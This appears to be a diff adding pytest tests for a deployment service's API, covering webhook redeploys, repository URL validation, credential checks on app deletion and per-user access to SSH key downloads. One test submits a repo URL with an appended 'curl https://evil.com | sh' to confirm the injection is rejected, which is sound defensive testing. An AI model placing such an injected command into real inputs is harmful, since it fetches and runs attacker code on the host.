@@ -215,6 +215,7 @@ class TestAPIEndpoints:
         # Register User 1
         res1 = client.post("/api/auth/register", json={"email": "u1@test.com", "password": "Password123!"})
         token1 = res1.json()["token"]
+        assert token1
         u1_id = res1.json()["user"]["id"]
 
         # Register User 2
@@ -232,9 +233,16 @@ class TestAPIEndpoints:
     def test_github_webhook_endpoint(self):
         client = TestClient(app)
 
-        # Create user and app
+        # Create user and app with nodejs runtime
         user = models.create_user("webhook_user@test.com", auth.hash_password("Password123!"))
-        models.save_app("app-hook1", "https://github.com/webhook/test", "http://5.5.5.5", "i-0hook123", user_id=user["id"])
+        models.save_app(
+            "app-hook1",
+            "https://github.com/webhook/test",
+            "http://5.5.5.5",
+            "i-0hook123",
+            user_id=user["id"],
+            app_type="nodejs"
+        )
 
         # Trigger webhook push
         payload = {
@@ -253,6 +261,7 @@ class TestAPIEndpoints:
         # Verify status was updated to REDEPLOYING
         app_record = models.get_app_by_id("app-hook1")
         assert app_record["status"] == "REDEPLOYING"
+        assert app_record["app_type"] == "nodejs"
 
         # Webhook for non-existent app returns 404
         not_found = client.post("/api/webhooks/github/non-existent-app-999", json=payload)
@@ -314,4 +323,81 @@ class TestAPIEndpoints:
         assert res.status_code == 400
         assert "Placeholder" in res.json()["detail"] or "invalid" in res.json()["detail"].lower()
 
+    def test_deploy_endpoint_rejects_malicious_or_invalid_repo_url(self):
+        client = TestClient(app)
+        reg = client.post("/api/auth/register", json={"email": "safety@test.com", "password": "Password123!"})
+        token = reg.json()["token"]
 
+        # Test command injection attempt
+        injection_res = client.post(
+            "/deploy",
+            headers={"Authorization": f"Bearer {token}"},
+            json={
+                "repo_url": "https://github.com/user/repo; curl https://evil.com | sh",
+                "app_type": "python",
+                "aws_key": "AKIA1111222233334444",
+                "aws_secret": "SecretKey1234567890Abc",
+            }
+        )
+        assert injection_res.status_code == 400
+        assert "Invalid GitHub repository URL" in injection_res.json()["detail"]
+
+        # Test non-GitHub URL
+        gitlab_res = client.post(
+            "/deploy",
+            headers={"Authorization": f"Bearer {token}"},
+            json={
+                "repo_url": "https://gitlab.com/user/repo",
+                "app_type": "python",
+                "aws_key": "AKIA1111222233334444",
+                "aws_secret": "SecretKey1234567890Abc",
+            }
+        )
+        assert gitlab_res.status_code == 400
+
+    def test_delete_endpoint_requires_credentials_when_vault_empty(self):
+        client = TestClient(app)
+        reg = client.post("/api/auth/register", json={"email": "delcheck@test.com", "password": "Password123!"})
+        token = reg.json()["token"]
+        uid = reg.json()["user"]["id"]
+
+        models.save_app("app-delcheck", "https://github.com/test/repo", "http://9.9.9.9", "i-0delcheck123", user_id=uid)
+
+        # Attempt to delete without vault keys or payload keys
+        del_res = client.delete("/delete/i-0delcheck123", headers={"Authorization": f"Bearer {token}"})
+        assert del_res.status_code == 400
+        assert "AWS credentials required to terminate" in del_res.json()["detail"]
+
+    def test_download_ssh_key_endpoint(self):
+        client = TestClient(app)
+
+        # 1. Unauthenticated request rejected
+        unauth = client.get("/api/apps/app-ssh1/ssh-key")
+        assert unauth.status_code == 401
+
+        # 2. Setup User A (owner) and User B (attacker)
+        user_a = models.create_user("ssh_owner@test.com", auth.hash_password("Password123!"))
+        token_a = auth.create_access_token({"sub": user_a["id"], "email": user_a["email"]})
+
+        user_b = models.create_user("ssh_attacker@test.com", auth.hash_password("Password123!"))
+        token_b = auth.create_access_token({"sub": user_b["id"], "email": user_b["email"]})
+
+        sample_pem = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0\n-----END RSA PRIVATE KEY-----"
+        models.save_app(
+            "app-ssh1",
+            "https://github.com/test/repo",
+            "http://1.2.3.4",
+            "i-0sshkeytest",
+            user_id=user_a["id"],
+            ssh_key=sample_pem
+        )
+
+        # 3. User B cannot download User A's SSH key (403 Forbidden)
+        res_b = client.get("/api/apps/app-ssh1/ssh-key", headers={"Authorization": f"Bearer {token_b}"})
+        assert res_b.status_code == 403
+
+        # 4. Owner downloads decrypted SSH key (200 OK)
+        res_a = client.get("/api/apps/app-ssh1/ssh-key", headers={"Authorization": f"Bearer {token_a}"})
+        assert res_a.status_code == 200
+        assert res_a.text == sample_pem
+        assert 'attachment; filename="key-app-ssh1.pem"' in res_a.headers["content-disposition"]
